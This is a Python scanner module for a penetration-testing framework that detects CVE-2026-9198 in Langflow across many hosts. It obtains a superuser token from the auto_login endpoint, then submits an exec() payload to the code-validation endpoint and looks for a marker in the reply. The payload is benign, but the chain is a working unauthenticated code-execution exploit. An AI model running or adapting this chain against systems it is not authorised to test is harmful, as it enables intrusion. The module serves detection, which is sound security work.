import json
import ssl
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

AUTO_LOGIN = "/api/v1/auto_login"
VALIDATE = "/api/v1/validate/code"

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""

class LangflowCve20269198Scanner(Auxiliary):
    NAME = "IBM Langflow auto_login + validate_code RCE Detection (CVE-2026-9198)"
    DESCRIPTION = (
        "Detects IBM Langflow OSS 1.0.0-1.10.0 unauth RCE. Fetches a "
        "superuser token from /api/v1/auto_login, then submits a benign "
        "exec() marker payload to /api/v1/validate/code. Does not execute "
        "shell commands."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-03-12"
    CHECK = True
    REFERENCES = [
        "CVE-2026-9198",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-9198",
    ]
    OPTIONS = [
        Option("RHOSTS", required=True, description="target(s)"),
        Option("RPORT", default=7860, type=int, description="Langflow HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool, description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts: raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _probe(self, host):
        ctx = ssl._create_unverified_context()
        try:
            req = urllib.request.Request(self._base(host) + AUTO_LOGIN)
            req.add_header("User-Agent", "Mozilla/5.0 (metis)")
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                if r.status != 200:
                    return HostResult(host, "safe", "auto_login HTTP " + str(r.status))
                data = json.loads(r.read().decode(errors="replace") or "{}")
        except urllib.error.HTTPError as e:
            return HostResult(host, "safe", "auto_login HTTP " + str(e.code))
        except (urllib.error.URLError, ValueError) as e:
            return HostResult(host, "unknown", type(e).__name__)
        token = data.get("access_token")
        if not token:
            return HostResult(host, "safe", "no token issued")
        payload = (
            "def _m(_=exec('raise Exception(\"METIS_9198_OK\")')):\n"
            "    pass\n"
        )
        body = json.dumps({"code": payload}).encode()
        req = urllib.request.Request(self._base(host) + VALIDATE, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Authorization", "Bearer " + token)
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                text = r.read().decode(errors="replace"); status = r.status
        except urllib.error.HTTPError as e:
            text = e.read().decode(errors="replace"); status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)
        if "METIS_9198_OK" in text:
            return HostResult(host, "vulnerable", "marker observed")
        return HostResult(host, "safe", "HTTP " + str(status) + " without marker")

    def _record(self, h):
        svc = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(h.host, self.options["RPORT"], proto="tcp",
                            state="open", name=svc, banner="Langflow")
        self.report_vuln(name=self.NAME, address=h.host, severity="critical",
                         refs="CVE-2026-9198", info=h.detail)

    def check(self):
        host = self._expand_targets()[0]
        print(colors.info("check: probing " + self._base(host)))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"]); stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info("scanning " + str(len(targets)) + " host(s)"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits, clean, unknown, aborted = [], 0, 0, False
        db = self._db(); ws = bool(db and db.current_workspace_id())
        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try: r = fut.result()
                    except Exception: unknown += 1; continue
                    if r.state == "vulnerable":
                        hits.append(r); bar.log(colors.vuln(r.host + " - " + r.detail))
                        if ws: self._record(r)
                        if stop_first:
                            aborted = True
                            for f in futures: f.cancel()
                            break
                    elif r.state == "safe": clean += 1
                    else: unknown += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted: print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        return hits
